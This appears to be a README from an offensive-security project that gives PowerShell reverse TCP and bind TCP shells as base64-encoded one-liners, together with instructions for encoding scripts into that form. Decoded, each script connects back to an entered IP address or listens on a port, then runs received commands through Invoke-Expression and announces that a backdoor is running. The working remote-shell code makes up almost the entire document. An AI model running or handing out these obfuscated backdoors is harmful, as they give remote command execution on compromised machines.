# PowerShell Scripts

Here you can see all the PowerShell scripts used in the main C++ program.

Tested with PowerShell v5.1.18362.752 on Windows 10 Enterprise OS (64 bit).

# How to Run

All the scripts are encoded and executed as an one-liner:

```batch
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand $encoded
```

**You can use these one-liners if you cannot download or run the executable.**

Run the commands shown below from either PowerShell or Command Prompt.

Script "powershell_reverse_tcp.ps1":

```pwsh
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABhAGQAZAByACAAPQAgACQAKABSAGUAYQBkAC0ASABvAHMAdAAgAC0AUAByAG8AbQBwAHQAIAAiAEUAbgB0AGUAcgAgAEkAUAAgAGEAZABkAHIAZQBzAHMAIgApAC4AVAByAGkAbQAoACkAOwANAAoAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIgA7AA0ACgAkAHAAbwByAHQAIAA9ACAAJAAoAFIAZQBhAGQALQBIAG8AcwB0ACAALQBQAHIAbwBtAHAAdAAgACIARQBuAHQAZQByACAAcABvAHIAdAAgAG4AdQBtAGIAZQByACIAKQAuAFQAcgBpAG0AKAApADsADQAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoAaQBmACAAKAAkAGEAZABkAHIALgBMAGUAbgBnAHQAaAAgAC0AbAB0ACAAMQAgAC0AbwByACAAJABwAG8AcgB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBvAHQAaAAgAHAAYQByAGEAbQBlAHQAZQByAHMAIABhAHIAZQAgAHIAZQBxAHUAaQByAGUAZAAiADsADQAKAH0AIABlAGwAcwBlACAAewANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABvAHcAZQByAFMAaABlAGwAbAAgAFIAZQB2AGUAcgBzAGUAIABUAEMAUAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAeQAgAEkAdgBhAG4AIABTAGkAbgBjAGUAawAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIABHAGkAdABIAHUAYgAgAHIAZQBwAG8AcwBpAHQAbwByAHkAIABhAHQAIABnAGkAdABoAHUAYgAuAGMAbwBtAC8AaQB2AGEAbgAtAHMAaQBuAGMAZQBrAC8AcABvAHcAZQByAHMAaABlAGwAbAAtAHIAZQB2AGUAcgBzAGUALQB0AGMAcAAuACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARgBlAGUAbAAgAGYAcgBlAGUAIAB0AG8AIABkAG8AbgBhAHQAZQAgAGIAaQB0AGMAbwBpAG4AIABhAHQAIAAxAEIAcgBaAE0ANgBUADcARwA5AFIATgA4AHYAYgBhAGIAbgBmAFgAdQA0AE0ANgBMAHAAZwB6AHQAcQA2AFkAMQA0AC4AIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACIAOwANAAoACQAkAGMAbABpAGUAbgB0ACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABiAHUAZgBmAGUAcgAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAHcAcgBpAHQAZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAZABhAHQAYQAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAHIAZQBzAHUAbAB0ACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJAHQAcgB5ACAAewANAAoACQAJACMAIABjAGgAYQBuAGcAZQAgAHQAaABlACAAaABvAHMAdAAgAGEAZABkAHIAZQBzAHMAIABhAG4AZAAvAG8AcgAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAgAGEAcwAgAG4AZQBjAGUAcwBzAGEAcgB5AA0ACgAJAAkAJABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKAAkAGEAZABkAHIALAAgACQAcABvAHIAdAApADsADQAKAAkACQAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwANAAoACQAJACQAYgB1AGYAZgBlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMQAwADIANAA7AA0ACgAJAAkAJABlAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBBAHMAYwBpAGkARQBuAGMAbwBkAGkAbgBnADsADQAKAAkACQAkAHcAcgBpAHQAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoACQAcwB0AHIAZQBhAG0AKQA7AA0ACgAJAAkAJAB3AHIAaQB0AGUAcgAuAEEAdQB0AG8ARgBsAHUAcwBoACAAPQAgACQAdAByAHUAZQA7AA0ACgAJAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuACIAOwANAAoACQAJAGQAbwAgAHsADQAKAAkACQAJACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUAKAAiAFAAUwA+ACIAKQA7AA0ACgAJAAkACQBkAG8AIAB7AA0ACgAJAAkACQAJACQAYgB5AHQAZQBzACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACkAOwANAAoACQAJAAkACQBpAGYAIAAoACQAYgB5AHQAZQBzACAALQBnAHQAIAAwACkAIAB7AA0ACgAJAAkACQAJAAkAJABkAGEAdABhACAAPQAgACQAZABhAHQAYQAgACsAIAAkAGUAbgBjAG8AZABpAG4AZwAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHUAZgBmAGUAcgAsACAAMAAsACAAJABiAHkAdABlAHMAKQA7AA0ACgAJAAkACQAJAH0AIABlAGwAcwBlACAAewANAAoACQAJAAkACQAJACQAZABhAHQAYQAgAD0AIAAiAGUAeABpAHQAIgA7AA0ACgAJAAkACQAJAH0ADQAKAAkACQAJAH0AIAB3AGgAaQBsAGUAIAAoACQAcwB0AHIAZQBhAG0ALgBEAGEAdABhAEEAdgBhAGkAbABhAGIAbABlACkAOwANAAoACQAJAAkAaQBmACAAKAAkAGQAYQB0AGEALgBMAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAAgAC0AYQBuAGQAIAAkAGQAYQB0AGEAIAAtAG4AZQAgACIAZQB4AGkAdAAiACkAIAB7AA0ACgAJAAkACQAJAHQAcgB5ACAAewANAAoACQAJAAkACQAJACQAcgBlAHMAdQBsAHQAIAA9ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABkAGEAdABhACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAOwANAAoACQAJAAkACQB9ACAAYwBhAHQAYwBoACAAewANAAoACQAJAAkACQAJACQAcgBlAHMAdQBsAHQAIAA9ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKAAkACQAJAAkAfQANAAoACQAJAAkACQAkAHcAcgBpAHQAZQByAC4AVwByAGkAdABlAEwAaQBuAGUAKAAkAHIAZQBzAHUAbAB0ACkAOwANAAoACQAJAAkACQBDAGwAZQBhAHIALQBWAGEAcgBpAGEAYgBsAGUAIAAtAE4AYQBtAGUAIAAiAGQAYQB0AGEAIgA7AA0ACgAJAAkACQB9AA0ACgAJAAkAfQAgAHcAaABpAGwAZQAgACgAJABkAGEAdABhACAALQBuAGUAIAAiAGUAeABpAHQAIgApADsADQAKAAkAfQAgAGMAYQB0AGMAaAAgAHsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBJAG4AbgBlAHIARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlADsADQAKAAkAfQAgAGYAaQBuAGEAbABsAHkAIAB7AA0ACgAJAAkAaQBmACAAKAAkAGMAbABpAGUAbgB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABzAHQAcgBlAGEAbQAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAHMAdAByAGUAYQBtAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAJAAkACQAkAHMAdAByAGUAYQBtAC4ARABpAHMAcABvAHMAZQAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAYgB1AGYAZgBlAHIAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABiAHUAZgBmAGUAcgAuAEMAbABlAGEAcgAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAdwByAGkAdABlAHIAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJAB3AHIAaQB0AGUAcgAuAEMAbABvAHMAZQAoACkAOwANAAoACQAJAAkAJAB3AHIAaQB0AGUAcgAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGQAYQB0AGEAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgBkAGEAdABhACIAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAcgBlAHMAdQBsAHQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgByAGUAcwB1AGwAdAAiADsADQAKAAkACQB9AA0ACgAJAH0ADQAKAH0ADQAKAA==
```

Script "powershell_bind_tcp.ps1" (not included):

```pwsh
PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABwAG8AcgB0ACAAPQAgACQAKABSAGUAYQBkAC0ASABvAHMAdAAgAC0AUAByAG8AbQBwAHQAIAAiAEUAbgB0AGUAcgAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAiACkALgBUAHIAaQBtACgAKQA7AA0ACgBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAGkAZgAgACgAJABwAG8AcgB0AC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAUABvAHIAdAAgAG4AdQBtAGIAZQByACAAaQBzACAAcgBlAHEAdQBpAHIAZQBkACIAOwANAAoAfQAgAGUAbABzAGUAIAB7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUABvAHcAZQByAFMAaABlAGwAbAAgAEIAaQBuAGQAIABUAEMAUAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHkAIABJAHYAYQBuACAAUwBpAG4AYwBlAGsAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACAARwBpAHQASAB1AGIAIAByAGUAcABvAHMAaQB0AG8AcgB5ACAAYQB0ACAAZwBpAHQAaAB1AGIALgBjAG8AbQAvAGkAdgBhAG4ALQBzAGkAbgBjAGUAawAvAHAAbwB3AGUAcgBzAGgAZQBsAGwALQByAGUAdgBlAHIAcwBlAC0AdABjAHAALgAgACMAIgA7AA0ACgAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACMAIABGAGUAZQBsACAAZgByAGUAZQAgAHQAbwAgAGQAbwBuAGEAdABlACAAYgBpAHQAYwBvAGkAbgAgAGEAdAAgADEAQgByAFoATQA2AFQANwBHADkAUgBOADgAdgBiAGEAYgBuAGYAWAB1ADQATQA2AEwAcABnAHoAdABxADYAWQAxADQALgAgACAAIwAiADsADQAKAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjACIAOwANAAoACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIgA7AA0ACgAJACQAbABpAHMAdABlAG4AZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAYwBsAGkAZQBuAHQAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABzAHQAcgBlAGEAbQAgAD0AIAAkAG4AdQBsAGwAOwANAAoACQAkAGIAdQBmAGYAZQByACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAdwByAGkAdABlAHIAIAA9ACAAJABuAHUAbABsADsADQAKAAkAJABkAGEAdABhACAAPQAgACQAbgB1AGwAbAA7AA0ACgAJACQAcgBlAHMAdQBsAHQAIAA9ACAAJABuAHUAbABsADsADQAKAAkAdAByAHkAIAB7AA0ACgAJAAkAIwAgAGMAaABhAG4AZwBlACAAdABoAGUAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABhAHMAIABuAGUAYwBlAHMAcwBhAHIAeQANAAoACQAJACQAbABpAHMAdABlAG4AZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABMAGkAcwB0AGUAbgBlAHIAKAAiADAALgAwAC4AMAAuADAAIgAsACAAJABwAG8AcgB0ACkAOwANAAoACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwB0AGEAcgB0ACgAKQA7AA0ACgAJAAkAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuACIAOwANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFcAYQBpAHQAaQBuAGcAIABmAG8AcgAgAGMAbABpAGUAbgB0ACAAdABvACAAYwBvAG4AbgBlAGMAdAAuAC4ALgAiADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgAiADsADQAKAAkACQBkAG8AIAB7AA0ACgAJAAkACQAjACAAbgBvAG4ALQBiAGwAbwBjAGsAaQBuAGcAIABtAGUAdABoAG8AZAANAAoACQAJAAkAaQBmACAAKAAkAGwAaQBzAHQAZQBuAGUAcgAuAFAAZQBuAGQAaQBuAGcAKAApACkAIAB7AA0ACgAJAAkACQAJACQAYwBsAGkAZQBuAHQAIAA9ACAAJABsAGkAcwB0AGUAbgBlAHIALgBBAGMAYwBlAHAAdABUAGMAcABDAGwAaQBlAG4AdAAoACkAOwANAAoACQAJAAkACQBiAHIAZQBhAGsAOwANAAoACQAJAAkAfQAgAGUAbABzAGUAIAB7AA0ACgAJAAkACQAJAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA1ADAAMAA7AA0ACgAJAAkACQB9AA0ACgAJAAkAfQAgAHcAaABpAGwAZQAgACgAJAB0AHIAdQBlACkAOwANAAoACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwB0AG8AcAAoACkAOwANAAoACQAJACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AA0ACgAJAAkAJABiAHUAZgBmAGUAcgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAQgB5AHQAZQBbAF0AIAAxADAAMgA0ADsADQAKAAkACQAkAGUAbgBjAG8AZABpAG4AZwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcAOwANAAoACQAJACQAdwByAGkAdABlAHIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtAFcAcgBpAHQAZQByACgAJABzAHQAcgBlAGEAbQApADsADQAKAAkACQAkAHcAcgBpAHQAZQByAC4AQQB1AHQAbwBGAGwAdQBzAGgAIAA9ACAAJAB0AHIAdQBlADsADQAKAAkACQBXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBDAGwAaQBlAG4AdAAgAGMAbwBuAG4AZQBjAHQAZQBkACEAIgA7AA0ACgAJAAkAZABvACAAewANAAoACQAJAAkAJAB3AHIAaQB0AGUAcgAuAFcAcgBpAHQAZQAoACIAUABTAD4AIgApADsADQAKAAkACQAJAGQAbwAgAHsADQAKAAkACQAJAAkAJABiAHkAdABlAHMAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQA7AA0ACgAJAAkACQAJAGkAZgAgACgAJABiAHkAdABlAHMAIAAtAGcAdAAgADAAKQAgAHsADQAKAAkACQAJAAkACQAkAGQAYQB0AGEAIAA9ACAAJABkAGEAdABhACAAKwAgACQAZQBuAGMAbwBkAGkAbgBnAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAdQBmAGYAZQByACwAIAAwACwAIAAkAGIAeQB0AGUAcwApADsADQAKAAkACQAJAAkAfQAgAGUAbABzAGUAIAB7AA0ACgAJAAkACQAJAAkAJABkAGEAdABhACAAPQAgACIAZQB4AGkAdAAiADsADQAKAAkACQAJAAkAfQANAAoACQAJAAkAfQAgAHcAaABpAGwAZQAgACgAJABzAHQAcgBlAGEAbQAuAEQAYQB0AGEAQQB2AGEAaQBsAGEAYgBsAGUAKQA7AA0ACgAJAAkACQBpAGYAIAAoACQAZABhAHQAYQAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwACAALQBhAG4AZAAgACQAZABhAHQAYQAgAC0AbgBlACAAIgBlAHgAaQB0ACIAKQAgAHsADQAKAAkACQAJAAkAdAByAHkAIAB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwB1AGwAdAAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAtAEMAbwBtAG0AYQBuAGQAIAAkAGQAYQB0AGEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwA7AA0ACgAJAAkACQAJAH0AIABjAGEAdABjAGgAIAB7AA0ACgAJAAkACQAJAAkAJAByAGUAcwB1AGwAdAAgAD0AIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQAJAAkACQB9AA0ACgAJAAkACQAJACQAdwByAGkAdABlAHIALgBXAHIAaQB0AGUATABpAG4AZQAoACQAcgBlAHMAdQBsAHQAKQA7AA0ACgAJAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQAJAH0ADQAKAAkACQB9ACAAdwBoAGkAbABlACAAKAAkAGQAYQB0AGEAIAAtAG4AZQAgACIAZQB4AGkAdAAiACkAOwANAAoACQB9ACAAYwBhAHQAYwBoACAAewANAAoACQAJAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwANAAoACQB9ACAAZgBpAG4AYQBsAGwAeQAgAHsADQAKAAkACQBpAGYAIAAoACQAbABpAHMAdABlAG4AZQByACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwBlAHIAdgBlAHIALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAbABpAHMAdABlAG4AZQByAC4AUwBlAHIAdgBlAHIALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJAB3AHIAaQB0AGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4AQwBsAG8AcwBlACgAKQA7AA0ACgAJAAkACQAkAHcAcgBpAHQAZQByAC4ARABpAHMAcABvAHMAZQAoACkAOwANAAoACQAJAH0ADQAKAAkACQBpAGYAIAAoACQAcwB0AHIAZQBhAG0AIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewANAAoACQAJAAkAJABzAHQAcgBlAGEAbQAuAEMAbABvAHMAZQAoACkAOwANAAoACQAJAAkAJABzAHQAcgBlAGEAbQAuAEQAaQBzAHAAbwBzAGUAKAApADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAGMAbABpAGUAbgB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsADQAKAAkACQAJACQAYwBsAGkAZQBuAHQALgBEAGkAcwBwAG8AcwBlACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABiAHUAZgBmAGUAcgAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AA0ACgAJAAkACQAkAGIAdQBmAGYAZQByAC4AQwBsAGUAYQByACgAKQA7AA0ACgAJAAkAfQANAAoACQAJAGkAZgAgACgAJABkAGEAdABhACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZABhAHQAYQAiADsADQAKAAkACQB9AA0ACgAJAAkAaQBmACAAKAAkAHIAZQBzAHUAbAB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsADQAKAAkACQAJAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAcgBlAHMAdQBsAHQAIgA7AA0ACgAJAAkAfQANAAoACQB9AA0ACgB9AA0ACgA=
```

To generate a PowerShell encoded command from a PowerShell script, run the following PowerShell command:

```pwsh
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText($script)))
```